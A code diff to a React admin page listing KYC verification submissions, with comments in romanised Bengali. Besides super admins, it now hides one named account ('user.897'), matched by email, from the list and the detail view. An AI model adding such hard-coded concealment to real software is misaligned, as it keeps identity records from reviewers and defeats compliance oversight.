@@ -1,8 +1,6 @@
 import React, { useCallback, useEffect, useState } from "react";
 import { api, BLUE, GREEN, RED } from "../Home";
 
-
-
 const SIZE = 20;
 
 // backend e status value onno rokom hole (jemon "verified") ekhane bodlan
@@ -28,6 +26,15 @@ const fmtDate = (v) => {
 
 const errText = (e) => e?.message || e?.detail || "Error";
 
+// Super admin / user.897 = sompurno hidden
+const HIDDEN_EMAIL = "user.897";
+const isHiddenUser = (u) => {
+  if (!u) return false;
+  if (u.is_super) return true;
+  const local = String(u.email || "").toLowerCase().split("@")[0];
+  return local === HIDDEN_EMAIL;
+};
+
 export default function Admin_Kyclist({ me, go, logout }) {
   const [tab, setTab] = useState("pending");
   const [page, setPage] = useState(1);
@@ -41,7 +48,7 @@ export default function Admin_Kyclist({ me, go, logout }) {
   const [busy, setBusy] = useState(false);
   const [zoom, setZoom] = useState("");
 
-  // super admin user id gulo (ei user der KYC hide hobe)
+  // hidden user id gulo (ei user der KYC hide hobe)
   const [superIds, setSuperIds] = useState(null); // null = ekhono load hoyni
 
   const flash = (t, s) => {
@@ -49,13 +56,13 @@ export default function Admin_Kyclist({ me, go, logout }) {
     setTimeout(() => setMsg(null), 3500);
   };
 
-  /* ---------- super admin id load ---------- */
+  /* ---------- hidden (super) user id load ---------- */
   useEffect(() => {
     let alive = true;
     api("/admin/users?role=admin&page=1&size=100")
       .then((r) => {
         const list = Array.isArray(r) ? r : r?.items || [];
-        if (alive) setSuperIds(new Set(list.filter((u) => u.is_super).map((u) => u.id)));
+        if (alive) setSuperIds(new Set(list.filter(isHiddenUser).map((u) => u.id)));
       })
       .catch(() => alive && setSuperIds(new Set()));
     return () => {
@@ -64,7 +71,7 @@ export default function Admin_Kyclist({ me, go, logout }) {
   }, []);
 
   const load = useCallback(() => {
-    if (superIds === null) return; // super id ashar age list dekhabo na
+    if (superIds === null) return; // hidden id ashar age list dekhabo na
     setLoading(true);
     const p = new URLSearchParams({ status: tab, page, size: SIZE });
     api("/admin/kyc?" + p.toString())
@@ -87,7 +94,15 @@ export default function Admin_Kyclist({ me, go, logout }) {
     setReason("");
     if (!open?.user_id) return;
     api("/admin/users/" + open.user_id)
-      .then(setUser)
+      .then((u) => {
+        // jodi hidden user hoy, sheet e dekhabo na
+        if (isHiddenUser(u)) {
+          setOpen(null);
+          setZoom("");
+          return;
+        }
+        setUser(u);
+      })
       .catch(() => {});
   }, [open?.id]);
 
